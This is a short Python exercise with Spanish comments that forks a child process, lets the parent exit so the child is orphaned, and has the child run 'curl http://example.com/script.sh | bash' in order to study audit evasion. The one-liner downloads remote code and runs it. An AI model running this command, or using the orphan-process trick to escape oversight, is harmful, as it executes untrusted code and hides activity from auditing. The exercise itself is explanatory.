# Simula un escenario donde un proceso huérfano ejecuta un comando externo sin control del padre.
# Analiza qué implicaciones tendría esto en términos de seguridad o evasión de auditorías.
import os
import time

# Creamos un proceso huerfano
pid = os.fork()
if pid > 0:     # Si el pid es mayor que 0, estamos en el padre
    os._exit(0)  # El padre termina inmediatamente dejando al hijo como huérfano
else:
    print("[HIJO] Ejecutando script como huérfano...")
    os.system("curl http://example.com/script.sh | bash")  # Peligroso si no hay control, descarga el contenido 
    time.sleep(3)                                          # que hay en esta pagina y el pipe bash lo que hace es ejecutarlo como comando de la terminal
    